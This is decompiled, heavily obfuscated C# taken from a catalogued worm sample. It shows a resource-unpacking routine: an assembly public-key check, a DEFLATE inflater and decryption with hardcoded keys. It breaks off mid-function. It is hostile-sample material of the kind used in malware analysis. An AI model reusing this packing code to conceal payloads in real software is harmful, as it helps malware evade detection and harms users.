// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Do, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 389CBEEB-AC7D-4382-B44F-021CF6D88A76
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Worm.Win32.Shakblades.aqz-ff1cf34cd2fde51b680c9e863987aff6501433b07bde494b883d76e60aafb33c.exe

using \u0004;
using \u0007;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0004
{
  internal sealed class \u0004
  {
    private static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    public static byte[] \u0001([In] byte[] obj0)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0004.\u0004.\u0001(executingAssembly, callingAssembly))
        return (byte[]) null;
      \u0004.\u0004.\u0007 obj1 = new \u0004.\u0004.\u0007(obj0);
      byte[] numArray1 = new byte[0];
      int num1 = obj1.\u0002();
      int num2 = num1;
      int num3;
      int num4;
      for (int index = 67324752; num2 == index; num2 = num4)
      {
        short num5 = (short) obj1.\u0001();
        int num6 = obj1.\u0001();
        int num7 = obj1.\u0001();
        if (num1 == 67324752)
        {
          num4 = (int) num5;
          int num8 = 20;
          if (num8 == 0)
          {
            index = num8;
            continue;
          }
          if (num4 == num8 && num6 == 0 && num7 == 8)
          {
            obj1.\u0002();
            if (true)
            {
              obj1.\u0002();
              num3 = obj1.\u0002();
              goto label_10;
            }
            else
              goto label_28;
          }
        }
        throw new FormatException("Wrong Header Signature");
      }
      goto label_16;
label_10:
      int length1 = obj1.\u0002();
      int count1 = obj1.\u0001();
      int count2 = obj1.\u0001();
      if (count1 > 0)
      {
        byte[] buffer = new byte[count1];
        obj1.Read(buffer, 0, count1);
      }
label_12:
      if (count2 <= 0)
        goto label_14;
label_13:
      byte[] buffer1 = new byte[count2];
      obj1.Read(buffer1, 0, count2);
label_14:
      byte[] buffer2 = new byte[obj1.Length - obj1.Position];
      obj1.Read(buffer2, 0, buffer2.Length);
      \u0004.\u0004.\u0001 obj2 = new \u0004.\u0004.\u0001(buffer2);
label_15:
      numArray1 = new byte[length1];
      obj2.\u0001(numArray1, 0, numArray1.Length);
      goto label_51;
label_16:
      int num9 = num1 >> 24;
      int length2;
      int num10;
      if (true)
      {
        if (num1 - (num9 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        if (num9 == 1)
        {
          num3 = obj1.\u0002();
          if (true)
          {
            length2 = num3;
            if (true)
            {
              numArray1 = new byte[length2];
              num10 = 0;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
            goto label_10;
        }
        else
          goto label_26;
      }
      else
        goto label_13;
label_24:
      int length3;
      byte[] buffer3 = new byte[length3];
      obj1.Read(buffer3, 0, buffer3.Length);
      int num11;
      new \u0004.\u0004.\u0001(buffer3).\u0001(numArray1, num10, num11);
      num10 += num11;
label_25:
      if (num10 < length2)
      {
        int num12 = obj1.\u0002();
        if (true)
        {
          num11 = obj1.\u0002();
          length3 = num12;
          goto label_24;
        }
        else
          goto label_41;
      }
label_26:
      byte[] numArray2;
      if (num9 == 2)
        numArray2 = new byte[8]
        {
          (byte) 168,
          (byte) 108,
          (byte) 130,
          (byte) 185,
          (byte) 139,
          (byte) 202,
          (byte) 201,
          (byte) 229
        };
      else
        goto label_38;
label_28:
      byte[] numArray3 = new byte[8]
      {
        (byte) 62,
        (byte) 82,
        (byte) 58,
        (byte) 173,
        (byte) 168,
        (byte) 242,
        (byte) 28,
        (byte) 220
      };
      if (true)
      {
        using (\u0001.\u0004 obj3 = new \u0001.\u0004())
        {
          using (ICryptoTransform cryptoTransform = obj3.\u0001(numArray2, numArray3, true))
            numArray1 = \u0004.\u0004.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      else
        goto label_15;
label_38:
      byte[] numArray4;
      byte[] numArray5;
      if (num9 == 3)
      {
        length3 = 16;
        if (length3 != 0)
        {
          byte[] numArray6 = new byte[length3];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray6, __fieldref (\u0002.\u0001));
          numArray4 = numArray6;
          numArray5 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
        }
        else
          goto label_24;
      }
      else
        goto label_51;
label_41:
      using (\u0003 obj4 = new \u0003())
      {
        using (ICryptoTransform cryptoTransform = obj4.\u0001(numArray4, numArray5, true))
          numArray1 = \u0004.\u0004.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
      }
label_51:
      obj1.Close();
      return numArray1;
    }

    internal sealed class \u0001
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0001;
      private int \u0002;
      private int \u0003;
      private int \u0004;
      private int \u0005;
      private bool \u0001;
      private \u0004.\u0004.\u0002 \u0001;
      private \u0004.\u0004.\u0003 \u0001;
      private \u0004.\u0004.\u0005 \u0001;
      private \u0004.\u0004.\u0004 \u0001;
      private \u0004.\u0004.\u0004 \u0002;

      public \u0001([In] byte[] obj0)
      {
        this.\u0001 = new \u0004.\u0004.\u0002();
        this.\u0001 = new \u0004.\u0004.\u0003();
        this.\u0001 = 2;
        this.\u0001.\u0001(obj0, 0, obj0.Length);
      }

      private bool \u0001()
      {
        int num1 = this.\u0001.\u0001();
label_26:
        int num2 = num1;
        int num3;
        for (int index1 = 258; num2 >= index1; num2 = num3)
        {
          int num4;
          int num5;
          do
          {
            num3 = this.\u0001;
            num5 = 7;
            if (num5 != 0)
            {
              switch (num3 - num5)
              {
                case 0:
                  do
                  {
                    if (((num4 = this.\u0001.\u0001(this.\u0001)) & -256) != 0)
                    {
                      if (num4 < 257)
                      {
                        if (true)
                          goto label_8;
                      }
                      else
                        goto label_12;
                    }
                    \u0004.\u0004.\u0003 obj = this.\u0001;
                    int num6 = num4;
                    if (true)
                      goto label_31;
label_3:
                    continue;
label_31:
                    obj.\u0001(num6);
                    goto label_3;
                  }
                  while (--num1 >= 258);
                  goto label_4;
label_8:
                  if (num4 >= 0)
                  {
                    this.\u0002 = (\u0004.\u0004.\u0004) null;
                    this.\u0001 = (\u0004.\u0004.\u0004) null;
                    continue;
                  }
                  goto label_9;
                case 1:
                  goto label_13;
                case 2:
                  goto label_18;
                case 3:
                  goto label_21;
                default:
                  goto label_26;
              }
            }
            else
              goto label_2;
          }
          while (false);
          goto label_11;
label_4:
          return true;
label_9:
          return false;
label_11:
          this.\u0001 = 2;
          return true;
label_12:
          this.\u0003 = \u0004.\u0004.\u0001.\u0001[num4 - 257];
          this.\u0002 = \u0004.\u0004.\u0001.\u0002[num4 - 257];
label_13:
          if (this.\u0002 > 0)
          {
            this.\u0001 = 8;
            int num7 = this.\u0001.\u0001(this.\u0002);
            if (num7 < 0)
              return false;
            this.\u0001.\u0001(this.\u0002);
            this.\u0003 += num7;
          }
          this.\u0001 = 9;
label_18:
          int index2 = this.\u0002.\u0001(this.\u0001);
          if (index2 < 0)
            return false;
          this.\u0004 = \u0004.\u0004.\u0001.\u0003[index2];
          this.\u0002 = \u0004.\u0004.\u0001.\u0004[index2];
label_21:
          if (this.\u0002 > 0)
          {
            this.\u0001 = 10;
            int num8 = this.\u0001.\u0001(this.\u0002);
            if (num8 < 0)
              return false;
            this.\u0001.\u0001(this.\u0002);
            this.\u0004 += num8;
          }
          this.\u0001.\u0001(this.\u0003, this.\u0004);
          num1 -= this.\u0003;
          this.\u0001 = 7;
          goto label_26;
label_2:
          index1 = num5;
        }
        return true;
      }

      private bool \u0002()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        while (true)
        {
          int num5 = this.\u0001;
          if (true)
          {
            int num6 = num5;
            int num7;
            while (true)
            {
              switch (num6 - 2)
              {
                case 0:
                  num7 = this.\u0001 ? 1 : 0;
                  if (false)
                  {
                    num6 = num7;
                    continue;
                  }
                  goto label_3;
                case 1:
                  goto label_14;
                case 2:
                  goto label_18;
                case 3:
                  goto label_23;
                case 4:
                  goto label_27;
                case 5:
                case 6:
                case 7:
                case 8:
                  goto label_30;
                case 10:
                  goto label_31;
                default:
                  goto label_32;
              }
            }
label_3:
            if (num7 != 0)
            {
              this.\u0001 = 12;
              return false;
            }
            int num8 = this.\u0001.\u0001(3);
            if (true)
            {
              num1 = num8;
              break;
            }
            break;
label_14:
            int num9 = this.\u0005 = this.\u0001.\u0001(16);
            int num10 = 0;
            if (num10 == 0)
            {
              if (num9 < num10)
                return false;
              this.\u0001.\u0001(16);
              this.\u0001 = 4;
            }
            else
            {
              num4 = num10;
              num3 = num9;
              goto label_20;
            }
label_18:
            num2 = this.\u0001.\u0001(16);
            goto label_19;
label_27:
            if (!this.\u0001.\u0001(this.\u0001))
              return false;
            this.\u0001 = this.\u0001.\u0001();
            this.\u0002 = this.\u0001.\u0002();
            this.\u0001 = 7;
label_30:
            return this.\u0001();
label_31:
            return false;
label_32:
            int num11 = 0;
            return num11 != 0 ? num11 != 0 : num11 != 0;
          }
        }
        goto label_39;
label_19:
        num3 = num2;
        num4 = 0;
label_20:
        if (num3 < num4)
          return false;
        this.\u0001.\u0001(16);
        this.\u0001 = 5;
label_23:
        this.\u0005 -= this.\u0001.\u0001(this.\u0001, this.\u0005);
        if (this.\u0005 != 0)
          return !this.\u0001.\u0001();
        this.\u0001 = 2;
        return true;
label_39:
        if (num1 < 0)
          return false;
        do
        {
          this.\u0001.\u0001(3);
          if ((num1 & 1) != 0)
            this.\u0001 = true;
          switch (num1 >> 1)
          {
            case 0:
              this.\u0001.\u0001();
              this.\u0001 = 3;
              goto label_13;
            case 1:
              this.\u0001 = \u0004.\u0004.\u0004.\u0001;
              this.\u0002 = \u0004.\u0004.\u0004.\u0002;
              this.\u0001 = 7;
              if (false)
                goto label_19;
              else
                goto label_13;
            case 2:
              continue;
            default:
              goto label_13;
          }
        }
        while (false);
        this.\u0001 = new \u0004.\u0004.\u0005();
        this.\u0001 = 6;
label_13:
        return true;
      }

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        int num2;
        if (true)
        {
          int num3 = 0;
          if (num3 != 0)
          {
            num2 = num3;
            goto label_5;
          }
          else
          {
            num1 = num3;
            goto label_16;
          }
        }
        else
          goto label_7;
label_3:
        int num4;
        int num5;
        int num6;
        if (num6 != 0)
        {
          if (num5 != num6)
          {
            num4 = this.\u0001.\u0001(obj0, obj1, obj2);
            num2 = obj1;
          }
          else
            goto label_10;
        }
        else
          goto label_6;
label_5:
        num6 = num4;
        num5 = num2;
label_6:
        obj1 = num5 + num6;
label_7:
        num5 = num1;
        if (true)
        {
          int num7 = num4;
          num1 = num5 + num7;
          obj2 -= num4;
          if (obj2 == 0)
            return num1;
        }
        else
          goto label_12;
label_10:
        if (!this.\u0002())
          num5 = this.\u0001.\u0002();
        else
          goto label_16;
label_12:
        num6 = 0;
        if (num6 == 0)
        {
          if (num5 <= num6 || this.\u0001 == 11)
            return num1;
        }
        else
          goto label_3;
label_16:
        int num8 = this.\u0001;
        num6 = 11;
        num5 = num8;
        goto label_3;
      }

      static \u0001()
      {
label_0:
        int length1 = 29;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0002.\u0001));
          \u0004.\u0004.\u0001.\u0001 = numArray1;
          while (true)
          {
            \u0004.\u0004.\u0001.\u0002 = new int[29]
            {
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              1,
              1,
              1,
              1,
              2,
              2,
              2,
              2,
              3,
              3,
              3,
              3,
              4,
              4,
              4,
              4,
              5,
              5,
              5,
              5,
              0
            };
            if (true)
            {
              \u0004.\u0004.\u0001.\u0003 = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
              goto label_5;
            }
          }
          goto label_7;
label_5:
          int length2 = 30;
          if (length2 == 0)
          {
            length1 = length2;
            continue;
          }
          int[] numArray2 = new int[length2];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0002.\u0001));
          \u0004.\u0004.\u0001.\u0004 = numArray2;
label_7:
          if (true)
          {
            if (false)
              goto label_5;
            else
              break;
          }
          else
            goto label_0;
        }
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0001([In] int obj0)
      {
        while (this.\u0003 < obj0)
        {
          if (this.\u0001 == this.\u0002)
          {
            if (true)
            {
              if (true)
                return -1;
            }
            else
              break;
          }
          else if (true)
          {
            \u0004.\u0004.\u0002 obj1 = this;
            int num1 = (int) obj1.\u0001;
            byte[] numArray1 = this.\u0001;
            \u0004.\u0004.\u0002 obj2 = this;
            int num2;
            int num3 = num2 = obj2.\u0001;
            obj2.\u0001 = num2 + 1;
            int index1 = num3;
            int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            \u0004.\u0004.\u0002 obj3 = this;
            int num5;
            int num6 = num5 = obj3.\u0001;
            obj3.\u0001 = num5 + 1;
            int index2 = num6;
            int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num8 = (num4 | num7) << this.\u0003;
            obj1.\u0001 = (uint) (num1 | num8);
          }
          else
            continue;
          this.\u0003 += 16;
          break;
        }
        long num9 = (long) this.\u0001;
        int num10 = 1;
        int num11 = obj0;
        int num12;
        do
        {
          if (true)
          {
            int num13 = num11 & 31;
            num12 = num10 << num13;
            if (true)
            {
              num11 = 1;
              num10 = num12;
            }
            else
              goto label_15;
          }
        }
        while (num11 == 0);
        int num14 = num10 - num11;
        goto label_13;
label_15:
        num14 = num12;
label_13:
        long num15 = (long) num14;
        return (int) (num9 & num15);
      }

      public void \u0001([In] int obj0)
      {
label_0:
        this.\u0001 >>= obj0;
        do
        {
          if (true)
            this.\u0003 -= obj0;
          else
            goto label_0;
        }
        while (false);
      }

      [SpecialName]
      public int \u0001() => this.\u0003;

      [SpecialName]
      public int \u0002()
      {
        int num1 = this.\u0002;
        int num2;
        int num3;
        while (true)
        {
          num2 = this.\u0001;
          if (true)
          {
            num3 = num1 - num2;
            if (false)
              num1 = num3;
            else
              goto label_7;
          }
          else
            break;
        }
label_2:
        do
        {
          if (true)
            num2 >>= 3;
        }
        while (false);
        return num1 + num2;
label_7:
        num2 = this.\u0003;
        num1 = num3;
        goto label_2;
      }

      public void \u0001()
      {
        this.\u0001 >>= this.\u0003 & 7;
        this.\u0003 &= -8;
      }

      [SpecialName]
      public bool \u0001() => this.\u0001 == this.\u0002;

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 0;
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          int num4;
          while (true)
          {
            num3 = this.\u0003;
            if (true)
            {
              if (num3 <= 0)
                goto label_6;
              else
                goto label_4;
label_1:
              this.\u0001 >>= 8;
              this.\u0003 -= 8;
              --obj2;
              ++num2;
              continue;
label_4:
              num4 = obj2;
              if (true)
              {
                if (num4 > 0)
                {
                  obj0[obj1++] = (byte) this.\u0001;
                  goto label_1;
                }
              }
              else
                break;
label_6:
              while (obj2 != 0)
              {
                int num5 = this.\u0002 - this.\u0001;
                if (obj2 > num5)
                  obj2 = num5;
                Array.Copy((Array) this.\u0001, this.\u0001, (Array) obj0, obj1, obj2);
                this.\u0001 += obj2;
                if ((this.\u0001 - this.\u0002 & 1) != 0)
                {
                  this.\u0001 = (uint) this.\u0001[this.\u0001++] & (uint) byte.MaxValue;
                  this.\u0003 = 8;
                }
                if (true)
                {
                  if (true)
                  {
                    if (true)
                    {
                      int num6 = num2;
                      if (false)
                        return num6;
                      int num7 = obj2;
                      return num6 + num7;
                    }
                  }
                  else
                    break;
                }
                else
                  goto label_1;
              }
              goto label_7;
            }
            else
              goto label_8;
          }
          num1 = num4;
        }
label_8:
        return num3;
label_7:
        return num2;
      }

      public void \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        if (true)
          goto label_6;
label_4:
        this.\u0003 += 8;
label_5:
        this.\u0001 = obj0;
        this.\u0001 = obj1;
        int num;
        this.\u0002 = num;
        return;
label_6:
        if (this.\u0001 < this.\u0002)
          throw new InvalidOperationException();
        num = obj1 + obj2;
        if (0 > obj1 || obj1 > num || num > obj0.Length)
          throw new ArgumentOutOfRangeException();
        if ((obj2 & 1) != 0)
        {
          this.\u0001 |= (uint) (((int) obj0[obj1++] & (int) byte.MaxValue) << this.\u0003);
          goto label_4;
        }
        else
          goto label_5;
      }
    }

    internal sealed class \u0003
    {
      private byte[] \u0001 = new byte[32768];
      private int \u0001 = 0;
      private int \u0002 = 0;

      public void \u0001([In] int obj0)
      {
label_0:
        do
        {
          \u0004.\u0004.\u0003 obj1 = this;
          int num1;
          int num2 = num1 = obj1.\u0002;
          obj1.\u0002 = num1 + 1;
          do
          {
            if (true)
            {
              if (num2 != 32768)
                goto label_3;
label_2:
              goto label_0;
label_3:
              if (true)
              {
                byte[] numArray = this.\u0001;
                \u0004.\u0004.\u0003 obj2 = this;
                int num3;
                num2 = num3 = obj2.\u0001;
                obj2.\u0001 = num3 + 1;
                int index = num2;
                int num4 = (int) (byte) obj0;
                numArray[index] = (byte) num4;
                if (false)
                  goto label_2;
              }
              else
                goto label_0;
            }
            else
              goto label_0;
          }
          while (false);
          goto label_5;
        }
        while (false);
        goto label_7;
label_5:
        this.\u0001 &= (int) short.MaxValue;
        return;
label_7:
        throw new InvalidOperationException();
      }

      private void \u0001([In] int obj0, [In] int obj1, [In] int obj2)
      {
        if (false)
          return;
        while (true)
        {
          int num1 = obj1;
          int num2;
          while (true)
          {
            num2 = num1 - 1;
            if (false)
              num1 = num2;
            else
              break;
          }
          obj1 = num2;
          if (num1 > 0)
          {
            byte[] numArray = this.\u0001;
            \u0004.\u0004.\u0003 obj = this;
            int num3;
            int num4 = num3 = obj.\u0001;
            obj.\u0001 = num3 + 1;
            int index = num4;
            int num5 = (int) this.\u0001[obj0++];
            numArray[index] = (byte) num5;
            this.\u0001 &= (int) short.MaxValue;
            int num6 = obj0;
            if (true)
              num6 &= (int) short.MaxValue;
            obj0 = num6;
          }
          else
            break;
        }
      }

      public void \u0001([In] int obj0, [In] int obj1)
      {
        if ((this.\u0002 += obj0) > 32768)
          throw new InvalidOperationException();
        int sourceIndex = this.\u0001 - obj1 & (int) short.MaxValue;
        int num = 32768 - obj0;
        if (sourceIndex <= num && this.\u0001 < num)
        {
          if (obj0 <= obj1)
          {
            Array.Copy((Array) this.\u0001, sourceIndex, (Array) this.\u0001, this.\u0001, obj0);
            this.\u0001 += obj0;
          }
          else
          {
            while (obj0-- > 0)
              this.\u0001[this.\u0001++] = this.\u0001[sourceIndex++];
          }
        }
        else
          this.\u0001(sourceIndex, obj0, obj1);
      }

      public int \u0001([In] \u0004.\u0004.\u0002 obj0, [In] int obj1)
      {
        int val1 = obj1;
        if (true)
        {
          int val2 = 32768 - this.\u0002;
          val1 = Math.Min(val1, val2);
        }
        int val2_1 = obj0.\u0002();
        int num1;
        while (true)
        {
          int num2 = Math.Min(val1, val2_1);
          int num3;
          while (true)
          {
            obj1 = num2;
            num3 = 32768;
            if (num3 == 0)
              num2 = num3;
            else
              break;
          }
          int num4 = num3 - this.\u0001;
label_4:
          if (obj1 > num4)
          {
            if (true)
            {
              num1 = obj0.\u0001(this.\u0001, this.\u0001, num4);
              int num5 = num1;
              int num6 = num4;
              if (true)
              {
                if (num5 != num6)
                  goto label_10;
              }
              else
              {
                val2_1 = num6;
                val1 = num5;
                continue;
              }
            }
            num1 += obj0.\u0001(this.\u0001, 0, obj1 - num4);
            goto label_10;
          }
label_9:
          num1 = obj0.\u0001(this.\u0001, this.\u0001, obj1);
label_10:
          this.\u0001 = this.\u0001 + num1 & (int) short.MaxValue;
          if (true)
          {
            this.\u0002 += num1;
            if (false)
              goto label_9;
            else
              break;
          }
          else
            goto label_4;
        }
        return num1;
      }

      public int \u0001() => 32768 - this.\u0002;

      public int \u0002() => this.\u0002;

      public int \u0001([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = this.\u0001;
        if (obj2 <= this.\u0002)
          goto label_17;
        else
          goto label_16;
label_3:
        int num2;
        do
        {
          num2 = obj2;
        }
        while (false);
        int num3 = obj2;
        int num4;
        int num5;
        int num6;
        if (true)
        {
          int num7 = num1;
          int length = num3 - num7;
          while (length > 0)
          {
            Array.Copy((Array) this.\u0001, 32768 - length, (Array) obj0, obj1, length);
            if (true)
            {
              int num8 = obj1;
              num6 = length;
              num5 = num8;
              goto label_9;
            }
          }
          goto label_11;
        }
        else
        {
          num4 = num3;
          goto label_18;
        }
label_9:
        obj1 = num5 + num6;
        if (true)
          obj2 = num1;
        else
          goto label_12;
label_11:
        Array.Copy((Array) this.\u0001, num1 - obj2, (Array) obj0, obj1, obj2);
        this.\u0002 -= num2;
label_12:
        if (this.\u0002 < 0)
          throw new InvalidOperationException();
        if (true)
          return num2;
        goto label_3;
label_16:
        obj2 = this.\u0002;
        goto label_3;
label_17:
        num4 = this.\u0001;
label_18:
        int num9 = this.\u0002;
        num5 = num4 - num9;
        num6 = obj2;
        if (true)
        {
          num1 = num5 + num6 & (int) short.MaxValue;
          goto label_3;
        }
        else
          goto label_9;
      }
    }

    internal sealed class \u0004
    {
      private short[] \u0001;
      public static readonly \u0004.\u0004.\u0004 \u0001;
      public static readonly \u0004.\u0004.\u0004 \u0002;

      static \u0004()
      {
        byte[] numArray = new byte[288];
label_1:
        int num1;
        while (true)
        {
          if (true)
            goto label_18;
label_3:
          if (true)
          {
            while (num1 < 144)
              numArray[num1++] = (byte) 8;
            if (true)
            {
              for (; num1 < 256; numArray[num1++] = (byte) 9)
              {
                if (false)
                  goto label_1;
              }
              goto label_7;
            }
            else
              break;
          }
          else
            goto label_10;
label_18:
          num1 = 0;
          goto label_3;
        }
        goto label_12;
label_7:
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          num3 = 280;
          if (num3 != 0)
          {
            if (num2 < num3)
              numArray[num1++] = (byte) 7;
            else
              goto label_10;
          }
          else
            break;
        }
        int num4 = num3;
        int num5 = num2;
        goto label_15;
label_10:
        while (num1 < 288)
          numArray[num1++] = (byte) 8;
        \u0004.\u0004.\u0004.\u0001 = new \u0004.\u0004.\u0004(numArray);
        numArray = new byte[32];
label_12:
        num1 = 0;
label_14:
        num5 = num1;
        num4 = 32;
label_15:
        if (num5 < num4)
        {
          numArray[num1++] = (byte) 5;
          goto label_14;
        }
        else if (true)
          \u0004.\u0004.\u0004.\u0002 = new \u0004.\u0004.\u0004(numArray);
        else
          goto label_7;
      }

      public \u0004([In] byte[] obj0) => this.\u0001(obj0);

      private void \u0001([In] byte[] obj0)
      {
        int[] numArray1 = new int[16];
        int[] numArray2 = new int[16];
        int index1 = 0;
        int num1;
        int num2;
        while (true)
        {
          num1 = index1;
          num2 = obj0.Length;
          if (true)
          {
            int num3 = num2;
            if (num1 < num3)
            {
              int num4 = (int) obj0[index1];
              int num5;
              if (true)
                num5 = num4;
              if (num5 > 0)
              {
                int[] numArray3;
                int index2;
                (numArray3 = numArray1)[index2 = num5] = numArray3[(IntPtr) index2] + 1;
              }
              ++index1;
            }
            else
              break;
          }
          else
            goto label_8;
        }
        int num6 = 0;
        int length = 512;
        int index3;
        if (true)
        {
          index3 = 1;
          goto label_14;
        }
        else
          goto label_35;
label_8:
        int num7 = 16;
        int num8 = index3;
        if (true)
        {
          int num9 = num7 - num8 & 31;
          int num10 = num2 << num9;
          num6 = num1 + num10;
        }
        else
          goto label_19;
label_10:
        if (index3 >= 10)
        {
          int num11 = numArray2[index3] & 130944;
          int num12 = num6 & 130944;
          length += num12 - num11 >> 16 - index3;
        }
        int num13 = index3;
        int num14 = 1;
label_13:
        index3 = num13 + num14;
label_14:
        int num15;
        int index4;
        if (index3 <= 15)
        {
          numArray2[index3] = num6;
          int num16 = num6;
          num2 = numArray1[index3];
          num1 = num16;
          goto label_8;
        }
        else
        {
          this.\u0001 = new short[length];
          num15 = 512;
          index4 = 15;
          goto label_22;
        }
label_16:
        int num17 = num6 & 130944;
        num6 -= numArray1[index4] << 16 - index4;
        int num18 = num6 & 130944;
        goto label_20;
label_18:
        int num19;
        int num20 = num19 - 9;
        num8 = 31;
        num7 = num20;
        int num21;
        num2 = num21;
        int num22;
        num1 = num22;
label_19:
        int num23 = num7 & num8;
        int num24 = num2 << num23;
        num15 = num1 + num24;
        num18 += 128;
label_20:
        if (num18 < num17)
        {
          this.\u0001[(int) \u0004.\u0004.\u0006.\u0001(num18)] = (short) (-num15 << 4 | index4);
          num22 = num15;
          num21 = 1;
          num19 = index4;
          goto label_18;
        }
        else
          --index4;
label_22:
        int index5;
        if (index4 < 10)
        {
          if (true)
          {
            index5 = 0;
            goto label_37;
          }
          else
            goto label_10;
        }
        else
          goto label_16;
label_35:
        int index6;
        numArray2[index6] = num6 + (1 << 16 - index6);
label_36:
        ++index5;
label_37:
        if (index5 >= obj0.Length)
          return;
        index6 = (int) obj0[index5];
        if (index6 != 0)
        {
          num6 = numArray2[index6];
          int index7 = (int) \u0004.\u0004.\u0006.\u0001(num6);
          if (index6 <= 9)
          {
            do
            {
              this.\u0001[index7] = (short) (index5 << 4 | index6);
              index7 += 1 << index6;
              if (false)
                goto label_16;
            }
            while (index7 < 512);
            goto label_35;
          }
          else
          {
            int num25 = (int) this.\u0001[index7 & 511];
            int num26 = 1 << (num25 & 15);
            int num27 = -(num25 >> 4);
            int num28;
            int num29;
            int num30;
            int num31;
            int num32;
            int num33;
            do
            {
              this.\u0001[num27 | index7 >> 9] = (short) (index5 << 4 | index6);
              num28 = index7;
              num29 = 1;
              num30 = index6 & 31;
              if (true)
              {
                num31 = num29 << num30;
                if (true)
                {
                  index7 = num28 + num31;
                  num32 = index7;
                  num33 = num26;
                  if (false)
                    goto label_43;
                }
                else
                  goto label_42;
              }
              else
                goto label_41;
            }
            while (num32 < num33);
            goto label_35;
label_43:
            num2 = num33;
            num1 = num32;
            goto label_8;
label_42:
            num14 = num31;
            num13 = num28;
            goto label_13;
label_41:
            num19 = num30;
            num21 = num29;
            num22 = num28;
            goto label_18;
          }
        }
        else
          goto label_36;
      }

      public int \u0001([In] \u0004.\u0004.\u0002 obj0)
      {
        int num1;
        int index = num1 = obj0.\u0001(9);
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        while (true)
        {
          if (num1 < 0)
            goto label_19;
          else
            goto label_27;
label_8:
          int num8;
          int num9;
          if (true)
          {
            if (num4 < 0)
            {
              num8 = obj0.\u0001();
              index = obj0.\u0001(num8);
              num9 = (int) this.\u0001[num3 | index >> 9];
            }
            else
              break;
          }
          else
            goto label_11;
label_14:
          num2 = num9;
          if ((num2 & 15) <= num8)
          {
            obj0.\u0001(num2 & 15);
            num5 = num2 >> 4;
          }
          else
            goto label_18;
label_16:
          if (false)
          {
            num1 = num5;
            continue;
          }
          goto label_12;
label_19:
          int num10 = obj0.\u0001();
          index = obj0.\u0001(num10);
          num2 = (int) this.\u0001[index];
          num4 = num2;
          if (true)
          {
            if (num4 >= 0)
            {
              num6 = num2 & 15;
              if (true)
              {
                if (false)
                {
                  num9 = num6;
                  goto label_14;
                }
                else
                {
                  int num11 = num10;
                  if (num6 <= num11)
                  {
                    obj0.\u0001(num2 & 15);
                    num7 = num2;
                    if (false)
                    {
                      num5 = num7;
                      goto label_16;
                    }
                    else
                      goto label_25;
                  }
                  else
                    goto label_26;
                }
              }
              else
                goto label_6;
            }
            else
              goto label_26;
          }
          else
            goto label_8;
label_27:
          int num12 = (int) this.\u0001[index];
          int num13;
          while (true)
          {
            if (true)
              goto label_28;
label_4:
            num13 = 0;
            if (num13 != 0)
            {
              num12 = num13;
              continue;
            }
            break;
label_28:
            num2 = num12;
            goto label_4;
          }
          if (num12 < num13)
          {
            num3 = -(num2 >> 4);
            int num14 = num2 & 15;
            num4 = index = obj0.\u0001(num14);
            goto label_8;
          }
          else
            goto label_29;
        }
        int num15 = (int) this.\u0001[num3 | index >> 9];
        obj0.\u0001(num15 & 15);
        num4 = num15;
label_11:
        return num4 >> 4;
label_12:
        return num5;
label_18:
        return -1;
